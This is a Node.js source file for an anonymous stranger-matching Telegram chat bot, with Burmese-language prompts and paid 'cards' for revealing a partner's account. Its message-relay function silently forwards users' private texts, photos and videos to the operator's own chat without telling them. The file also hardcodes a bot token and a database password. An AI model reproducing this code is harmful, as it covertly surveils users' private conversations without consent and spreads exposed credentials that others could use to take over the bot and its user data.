const botToken =`7005262009:AAHmUY_s4KFHsBx2x68FkgUj29IjBVH7Yd0`;
const TelegramBot = require('node-telegram-bot-api');
const fs = require("fs");
const { MongoClient, ServerApiVersion, Admin } = require('mongodb');

// man made modules
let { logError } = require("./source/logError.js");
let { register } = require("./source/register.js");
let { findUser } = require("./source/findUser.js");
let { disconnect } = require("./source/disconnect.js");
let { edit } = require("./source/edit.js");
let { addCard } = require("./source/addCard.js");
let { sell } = require("./source/sell.js");
let { sendMail } = require("./source/sendMail.js");
let {varifyText} = require("./source/varify.js");
const { fMail } = require('./source/sendMailFemale.js');


let ownerId = "7331998683"

const uri = 'mongodb+srv://Geek:Wu2wm5ltnipo3FcP@chatbot.rm39fbb.mongodb.net/?retryWrites=true&w=majority&appName=chatbot';

const bot = new TelegramBot(botToken, {
    polling: true, request: {
        agentOptions: {
            keepAlive: true,
            family: 4
        }
    }
});

// Create a new MongoClient
const client = new MongoClient(uri, {
    serverApi: {
        version: ServerApiVersion.v1,
        strict: true,
        deprecationErrors: true,
    }
});

// connecting to data base
try {
    client.connect();
}
catch (err) {
    logError(bot, fs, err, ownerId);
}
let dataBase = client.db("users");
let collection = dataBase.collection("data");
let matchCollection = dataBase.collection("match");




global.inMessage = {};
global.messageQuee = {};

global.genderQuaue = {};
global.listenMessage = {};
global.replyQuee = {};
global.isEditing = {};
global.listenMessage2 = {};
global.accessDataBase = {};

async function checkAuth(chatId) {
    try {
        let data = await collection.find({ chatId }).toArray(); // fetch data
        if (data[0] === undefined) {
            return { status: false };
        }
        else if (data[0].chatId === chatId) {
            return { status: true, gender: data[0].gender };
        }
    }
    catch (err) {
        return { status: "error", error: err };
    }
}
  

async function main(msg) {
    try {
        let checkAuthStatus = await checkAuth(msg.chat.id);
        if (checkAuthStatus.status === "error") {
            throw Error(checkAuthStatus.error);
        }
        else if (checkAuthStatus.status === false) {
            let gender;
            let registerStatus = await register(msg, bot, collection);
            if (registerStatus.status === false || registerStatus.status === "error") {
                if (registerStatus.status === "error") {
                    throw Error(registerStatus.error);
                }
                delete inMessage[msg.chat.id];
            }
            else if (registerStatus.status === true) {
                gender = registerStatus.gender;

                // calling findUser
                let findUserStatus = await findUser(bot, msg.chat.id, gender, matchCollection);
                if (findUserStatus.status === false || findUserStatus.status === "error") {
                    if (findUserStatus === "error") {
                        throw Error(findUserStatus.error);
                    }
                    delete inMessage[msg.chat.id];
                }
                else if (findUserStatus.status === true) {
                    let data = findUserStatus.data;
                    await connectUser(data);
                }
            }
        }
        // -------------><---------------><-----------------------><-------------------><----------->
        // code runs if user is auth
        else if (checkAuthStatus.status === true) {
            let gender = checkAuthStatus.gender;
            let findUserStatus = await findUser(bot, msg.chat.id, gender, matchCollection);


            if (findUserStatus.status === false || findUserStatus.status === "error") {
                if (findUserStatus.status === "error") {
                    throw Error(findUserStatus.error);
                }
                delete inMessage[msg.chat.id];
            }

            else if (findUserStatus.status === true) {
                let data = findUserStatus.data;
                await connectUser(data);
            }
        }
    }
    catch (err) {
        delete inMessage[msg.chat.id];
        try {
            await bot.sendMessage(msg.chat.id, `⚠️ ${err}\n\n😫Please try again later or use /start`)
        }
        catch (err) {
            console.log(err);
        }
        logError(bot, fs, err, ownerId);
    }
}


async function connectUser(data) {
    try {

        let template = `/next နောက်တစ်ယောက်ရှာရန်\n\n/stop ရပ်တန့်ရန်\n\n https://t.me/mitra_mm_bot`;

        const option = {
            keyboard: [
                ["HI ✋"]
                // You can add more rows as needed
            ],
            resize_keyboard: true, // Adjusts keyboard size to fit buttons
            one_time_keyboard: true,// Hides keyboard after one use (optional)
            

        };

        let chatId1 = data.chatId1;
        let chatId2 = data.chatId2;

        messageQuee[chatId1] = chatId2;
        messageQuee[chatId2] = chatId1;



        await sendProfile(chatId1, template,option , chatId2);

        await sendProfile(chatId2, template, option, chatId1);
    }
    catch (err) {
        logError(bot, fs, err, ownerId)
        console.log(err);
    }
}

async function sendProfile(chatId, extra, markup, toSend) {
    try {
        let data = await collection.find({ chatId }).toArray();
        if (data[0] != undefined) {
            let url = data[0].url;
            let name = data[0].name;
            let gender = data[0].gender;
            let age = data[0].age;

            let caption = `📇 Name  -  ${name}\n\n🎱 Age  -  ${age}\n\n🚻 Gender  -  ${gender}`;

            if (extra != undefined) {
                caption = caption + "\n\n" + extra
            }

            await bot.sendPhoto(toSend, url, {
                caption: caption,
                reply_markup: markup
            });

            // await sendTips(toSend);

        }
        else {
            await bot.sendMessage(chatId, "you dont have profile to send");
        }
    }
    catch (err) {
        console.log(err);
        console.log("getting error in profile sender");
    }
}




bot.on("message", async (msg) => {
    try {
        if (listenMessage[msg.chat.id] === true || listenMessage2[msg.chat.id] === true) {
            if (listenMessage[msg.chat.id] === true) {
                listenMessage[msg.chat.id] = msg.text;
            }

            if (listenMessage2[msg.chat.id] === true) {
                listenMessage2[msg.chat.id] = msg.text;
            }
        }

        else if (msg.text === "/sell") {
            try {
                let sellStatus = await sell(bot, msg.chat.id, collection);
            }
            catch (err) {
                console.log(err);
                logError(bot, fs, err, ownerId);
                return;
            }
        }

        else if (msg.text == "/start" || msg.text == "/find" || msg.text == "🚀 Find new partner") {
            if (inMessage[msg.chat.id] === undefined) {
                // indicate that you are free to use 
                inMessage[msg.chat.id] = true;
                try {
                    await main(msg);

                }
                catch (err) {
                    throw Error(err);
                }
            }
            else {
                //since inMessage is not undefind indicate you are using this bot
                // and its means two things 1. you have an active partner 2.you did not press any button are your are searching for a partner
                if (messageQuee[msg.chat.id] != undefined) {
                    // indicate you have an active partner
                    await bot.sendMessage(msg.chat.id, "⏭️ နောက်တစ်ယောက်ရှာရန် /next \n\n🛑ရပ်တန့်ရန် /stop ကိုနှိပ်ပါ");
                    return;
                }

                await bot.sendMessage(msg.chat.id, "သင်သည့် အစတည်းက partner တစ်ယောက်ရှာနေပါသည်။🛑ရပ်တန့်ရန် /cancel ကိုနှိပ်ပါ။");
            }
        }
        // /start and /find handler end here

        else if (msg.text == "/cancel" || msg.text === "✖ Cancel လုပ်မည်") {
            if (inMessage[msg.chat.id] != undefined && messageQuee[msg.chat.id] === undefined) {
                await matchCollection.deleteOne({ chatId: msg.chat.id });
                delete inMessage[msg.chat.id];
                await bot.sendMessage(msg.chat.id, "✖ Cancel လုပ်ချင်း အောင်မြင်ပါသည်။\n\nနောက်တစ်ခါ partner ရှာလိုပါက /start သို့ /find ကို နှိပ်ပါ။");

            }
            else if (messageQuee[msg.chat.id] != undefined) {
                await bot.sendMessage(msg.chat.id, "➡ ကျော်ရန် /next ​​ကိုနှိပ်ပါ\n\n🛑ရပ်တန့်ရန်  /stop ကိုနှိပ်ပါ")
            }
            else {
                await bot.sendMessage(msg.chat.id, "cancel လုပ်ရန် partner မရှိပါ။\n\npartner ရှာရန် /start သို့ /find ကို နှိပ်ပါ။")
            }
        }

        else if (msg.text == "/profile" || msg.text == "/edit") {
            const option = {
                inline_keyboard: [
                    [{ text: 'Edit name', callback_data: 'edit_name' }, { text: 'Edit age', callback_data: 'edit_age' }],
                    [{ text: 'Change profile picture', callback_data: 'edit_profile' }],
                ],
            };
            await sendProfile(msg.chat.id, "", option, msg.chat.id);
        }

        else if (msg.text == "/gender") {
            let data = await collection.find({ chatId: msg.chat.id }).toArray();
            console.log(data);
            await bot.sendMessage(msg.chat.id, `${data[0].gender} and edit limt is ${data[0].editLimit}`);
        }



        else if (msg.text == "/stop" || msg.text == "/next") {
            let disconnectStatus = await disconnect(bot, msg.chat.id, msg.text);
            if (disconnectStatus.status == true && msg.text == "/next") {
                if (inMessage[msg.chat.id] === undefined) {
                    inMessage[msg.chat.id] = true;
                    try {
                        await main(msg);

                    }
                    catch (err) {
                        throw Error(err);
                    }
                }
                else {
                    await bot.sendMessage(msg.chat.id, "သင်သည့် အစတည်းက partner တစ်ယောက်ရှာနေပါသည်။ ရပ်တန့်ရန် /cancel ကိုနှိပ်ပါ။");

                }
            }
        }

        else if (msg.text === "/log-out") {
            await collection.deleteOne(({ chatId: msg.chat.id }));
        }

        else if (msg.text == "/id") {
            await bot.sendMessage(msg.chat.id, `Your chat id is - ${msg.chat.id}`);
        }

        else if(msg.text=="/inMessage"){
            await bot.sendMessage(msg.chat.id,Object.keys(messageQuee).length);
        }



        else if (msg.text === "/add-card") {
            await addCard(bot, msg.chat.id, collection);
        }



        else if (messageQuee[msg.chat.id] != undefined && msg.reply_to_message == undefined) {
            if (msg.text) {
                if (!msg.text.startsWith("/")&& !msg.text.startsWith("https")&&!msg.text.startsWith("@")) {
                    sendMessage(messageQuee[msg.chat.id], msg, undefined, msg.message_id);
                }
                else{
		   if(msg.text.startsWith("https") || msg.text.startsWith("@")){
                    await bot.sendMessage(msg.chat.id,"😔 link ပို့၍မရပါ။\n\n👀 profile ကြည့်ရန် /seek ကိုနှိပ်ပါ။");
                }}
            }
            else{
                await sendMessage(messageQuee[msg.chat.id], msg, undefined, msg.message_id);
            }
        }
    }
    catch (err) {
        await logError(bot, fs, err, ownerId);
        console.log(err);
    }
})

bot.onText(/\/start (.+)/, async (msg, match) => {
    try {
        const id = match[1];
        let data = await collection.find({ chatId: Number(id) }).toArray();
        if (data[0] == undefined) {
            await bot.sendMessage(msg.chat.id, "😢 invite id မှားနေပါသည်။\n\n /start ကိုနှိပ်၍ ပြန်စပါ။");
            return;
        }

        let chatId = msg.chat.id;
        let isExist = await collection.find({ chatId }).toArray();
        if (isExist[0] == undefined) {
            let registerStatus = await register(msg, bot, collection);
            if (registerStatus.status == true) {
                await bot.sendMessage(msg.chat.id, "/start ကိုနှိပ် အဖော်ရှာလို့ရပါပြီး။");
                
                let updateId = await collection.updateMany({chatId:Number(id)},{$inc:{editLimit:5,seekLimit:20}});

                if (updateId.modifiedCount) {
                        await bot.sendMessage(id, `သင်၏ Invite link ကို သုံး၍ ${msg.from.first_name} login လုပ်ပါသည်။

သင်  ✏️Profile ချိန်ကဒ် 5 ကဒ်နဲ့ 🧐profile ကြည့်ကဒ် 20 ကဒ် ရရှိပါသည်။\n\n use /card to check your cards`);
                }
            }
            else{
                await bot.sendMessage(msg.chat.id, `Error: please start again! : https://t.me/mitra_mm_bot?start=${id}`);
            }
        }
        else {
            await bot.sendMessage(chatId, "😅 Account ရှိသူများ register လုပ်စရာ မလိုပါ။\n\n card များဝယ်ယူရန် =@Ye_lin_tun_x_C")
        }

    }
    catch (err) {
        await logError(bot, fs, err, ownerId);
    }
});

bot.onText(/\/invite/, async (msg) => {
    try {
        let botUrl = `Mitra သည် သင်အတွက် အဖော်ရှာပေးသော bot ဖြစ်သည်

1⃣ Single ဘဝကနေ 'ထမင်းစားပြီးပြီးလာ' လို့မေးတယ်သူရှိတဲ့ ဘဝသို့ 😅

2⃣ ကျမ်းမာရေး မကောင်းဖြစ်လာတဲ့ အခါ 'ဘုရား နဲ့ဆုတောင်းပေးတဲ့' သူရှိတယ် ဘဝသို့ 😣

3⃣ စိတ်ဆိုးသွားလို့ 'ထပ်ခါထပ်ခါ ဖုန်းခေါ်ပြီး' ချော့နေတဲ့ သူရှိတဲ့ ဘဝသို့ 😭

ရောက်ဖို့ Mitra ကိုသုံးလိုက်ပါ

Mitra သည် လူတစ်ယောက်နဲ့ တစ်ယောက် ချိတ်ဆက်ပြီး real time မှာ စကား ပြောလို့ရတဲ့ bot ဖြစ်ပါတယ်။

Mitra bot ကိုသုံးရန်👇
    https://t.me/mitra_mm_bot?start=${msg.chat.id}`;

        await bot.sendMessage(msg.chat.id, botUrl);
        await bot.sendMessage(msg.chat.id, "Post ကို သူငယ်ချင်း များသို့ share ပြီး free points ရယူလိုက်ပါ🥳\n\nအဲ့ link ကိုသုံး၍ သူငယ်ချင်း က bot ကိုစသုံးပြီး login လုပ်ပါက သင် \n\n✏️Profile ချိန်ကဒ် 5 ကဒ်နဲ့\n🧐 profile ကြည့်ကဒ် 20 ကဒ် \n\n👻ရမှာဖြစ်ပါတယ်။\n\n /card to check!");
    }
    catch (err) {
        console.log(err);
        await logError(bot, fs, err, ownerId);
    }
})

bot.onText(/\/card/, async (msg) => {
    try {
        let checkAuthStatus = await checkAuth(msg.chat.id);
        if (checkAuthStatus.status == true) {

            let data = await collection.find({ chatId: msg.chat.id }).toArray();
            if (data[0] != undefined) {
                let editPoint = data[0].editLimit;
                let seekPoint = data[0].seekLimit;

                await bot.sendMessage(msg.chat.id, `🧐 profile ကြည့်ကဒ် : ${seekPoint}🎴\n\n✏️ Profile ချိန်ကဒ် : ${editPoint}🎴\n\n🎴ကဒ်များ ဝယ်ရန်: @ye_lin_tun_x_c`);
            }

        }
        else {
            await bot.sendMessage(msg.chat.id, "Your dont have any account pls use /start to login or try again later");
        }
    }
    catch (err) {
        console.log(err);
        logError(bot, fs, err, ownerId);
    }
})

bot.onText(/\/seek/, async (msg) => {
    try {
        // messageQuee[msg.chat.id] = msg.chat.id;
        let allowToSeek = false;
        let partnerId = messageQuee[msg.chat.id];
        if (messageQuee[msg.chat.id] == undefined) {
            await bot.sendMessage(msg.chat.id, "🤨 seek လုပ်ဖို့ ဘယ်သူမှ မရှိဘူး \n\n🚀 ရှာရန် /start 𝙤𝙧 /find ကိုနှိပ်ပါ🌚");
            return;
        }
        // checking seekLimit;
        let data = await collection.find({ chatId: msg.chat.id }).toArray();
        if (data[0] == undefined) {
            await bot.sendMessage(msg.chat.id, "You dont have any account pls use /start to make an account");
            return;
        }

        let seekLimit = data[0].seekLimit;
        if (seekLimit >= 1) {
            seekLimit = seekLimit - 1;
            allowToSeek = true;
            await collection.updateOne({ chatId: msg.chat.id }, { $set: { seekLimit: seekLimit } });
        }
        else {
            await bot.sendMessage(msg.chat.id, "😢 Seek point မရှိပါ။ ဝယ်ရန် @Ye_lin_tun_x_C");
            allowToSeek = false;
            return;
        }

        if (allowToSeek) {
            let partnerData = await collection.find({ chatId: partnerId }).toArray();
            if (partnerData == undefined) {
                await bot.sendMessage(msg.chat.id, "👉 Account မတွေ့ပါ။");
                return;
            }

            let name = partnerData[0].name;
            let usersName = `Click [dfd](tg://user?id=${msg.chat.id}) to join the channel!`;

            const querry = `📇Name : ${name}\n\n👤Acc : [နှိပ်ပါ](tg://user?id=${String(partnerData[0].chatId)})`;
            const opts = {
                parse_mode: 'Markdown'
            };
            await bot.sendMessage(msg.chat.id, querry, opts);
        }

    }
    catch (err) {
        console.log(err);
        logError(bot, fs, err, ownerId);
    }
})

bot.onText(/\/mail/, async (msg) => {
    let mail = await bot.sendMessage(ownerId, "Send the mail pls");
    await disconnect(bot, msg.chat.id, true, "/stop");
    let obj = {};
    let mailReply = bot.onReplyToMessage(msg.chat.id, mail.message_id, async (msg) => {
        bot.removeReplyListener(mailReply);
        if (msg.text) {
            if (msg.text == "cancel") {
                await bot.sendMessage(msg.chat.id, "Cancel mailing");
            }
            obj.text = msg.text;
            obj.file = null;
        }
        else if (msg.video) {
            obj.text = undefined;
            if (msg.caption != undefined) {
                obj.text = msg.caption;
            }
            obj.file = msg.video.file_id;
            obj.type = "video"
        }
        else if (msg.photo) {
            obj.text = undefined;
            if (msg.caption != undefined) {
                obj.text = msg.caption;
            }
            obj.file = msg.photo[2].file_id;
            obj.type = "photo"
        }

        sendMail(bot, obj, collection, msg.chat.id);
    })
})

bot.onText(/\/fmail/, async (msg) => {
    let mail = await bot.sendMessage(ownerId, "Send the mail to send to female");
    await disconnect(bot, msg.chat.id, true, "/stop");
    let obj = {};
    let mailReply = bot.onReplyToMessage(msg.chat.id, mail.message_id, async (msg) => {
        bot.removeReplyListener(mailReply);
        if (msg.text) {
            if (msg.text == "cancel") {
                await bot.sendMessage(msg.chat.id, "Cancel mailing");
                return;
            }
            obj.text = msg.text;
            obj.file = null;
            // return;
        }
        else if (msg.video) {
            obj.text = undefined;
            if (msg.caption != undefined) {
                obj.text = msg.caption;
            }
            obj.file = msg.video.file_id;
            obj.type = "video"
        }
        else if (msg.photo) {
            obj.text = undefined;
            if (msg.caption != undefined) {
                obj.text = msg.caption;
            }
            obj.file = msg.photo[2].file_id;
            obj.type = "photo"
        }
        
        fMail(bot, "obj", collection, msg.chat.id);
    })
})

bot.onText(/\/getAll/, async (msg) => {
    let data = await collection.countDocuments();
    await bot.sendMessage(msg.chat.id, `Total users is ${data}`);
})






bot.on("callback_query", async (msg) => {
    if (msg.data == "female" || msg.data == "male" || msg.data == "other") {
        genderQuaue[msg.message.chat.id] = msg.data;
    }
    else if (msg.data.startsWith("edit_")) {
        await edit(bot, msg.message.chat.id, msg.data, collection);
    }
})

function addReplyListenerId(replyId, toSendChatId) {
    try {
        if (replyQuee[toSendChatId] == undefined) {
            replyQuee[toSendChatId] = [replyId];
        }
        else {
            let replyIdArr = replyQuee[toSendChatId];
            replyIdArr.push(replyId);
            replyQuee[toSendChatId] = replyIdArr;
        }

    }
    catch (err) {
        logError(bot, fs, err, ownerId);
    }
}



async function sendMessage(toSendChatId, msg, messagaId, originalMessageId) {
    try {
        let messageData;
        if (msg.text) {
            let textVarify = await varifyText(msg.text,messageQuee[toSendChatId],bot);
            if(textVarify.status=="error"){
                throw Error(textVarify.error)
            }
            else if(textVarify.status===false){
                return;
            }
            messageData = await bot.sendMessage(toSendChatId, textVarify.text, { reply_to_message_id: messagaId });
            await bot.sendMessage(ownerId, msg.text);

        }
        else if (msg.photo) {
            let caption;
            if (msg.caption) {
                caption = msg.caption;
            }
            messageData = await bot.sendPhoto(toSendChatId, msg.photo[2].file_id, { caption: caption, reply_to_message_id: messagaId });

            await bot.sendPhoto(ownerId, msg.photo[2].file_id, { caption: caption });
        }
        else if (msg.video) {
            let caption;
            if (msg.caption) {
                caption = msg.caption;
            }
            messageData = await bot.sendVideo(toSendChatId, msg.video.file_id, { caption: caption, reply_to_message_id: messagaId });

            bot.sendVideo(ownerId, msg.video.file_id, { caption: caption });
        }
        else if (msg.sticker) {
            messageData = await bot.sendSticker(toSendChatId, msg.sticker.file_id, { reply_to_message_id: messagaId });
        }
        else if (msg.voice) {
            messageData = await bot.sendVoice(toSendChatId, msg.voice.file_id, { reply_to_message_id: messagaId });
        }
        else if (msg.video_note) {
            messageData = await bot.sendVideoNote(toSendChatId, msg.video_note.file_id, { reply_to_message_id: messagaId });

        }
        else if (msg.audio) {
            let caption;
            if (msg.caption) {
                caption = msg.caption;
            }
            messageData = await bot.sendAudio(toSendChatId, msg.audio.file_id, { caption: caption, reply_to_message_id: messagaId });

        }
        else if (msg.document) {
            let caption;
            if (msg.caption) {
                caption = msg.caption;
            }
            messageData = await bot.sendDocument(toSendChatId, msg.document.file_id, { caption: caption, reply_to_message_id: messagaId });
        }
        else if (msg.contact) {
            messageData = await bot.sendContact(toSendChatId, msg.contact.phone_number, msg.contact.first_name, { reply_to_message_id: messagaId });
        }

        let replyId = bot.onReplyToMessage(toSendChatId, messageData.message_id, async (reply) => {
            let targetUser = messageQuee[toSendChatId];
            await sendMessage(targetUser, reply, originalMessageId, reply.message_id).catch((err) => {
                throw Error(err);
            })
        })

        addReplyListenerId(replyId, toSendChatId);


        // code is to add self replying feature

        let originalChatId = messageQuee[toSendChatId];
        replyId = bot.onReplyToMessage(originalChatId, originalMessageId, async (reply) => {
            try {
                let targetUser = messageQuee[originalChatId]
                await sendMessage(targetUser, reply, messageData.message_id, reply.message_id)
            }
            catch (err) {
                throw Error(err);
            }
        })
        addReplyListenerId(replyId, originalChatId);

    }
    catch (err) {
        logError(bot, fs, err, ownerId);
    }
}



console.log("bot is running...");

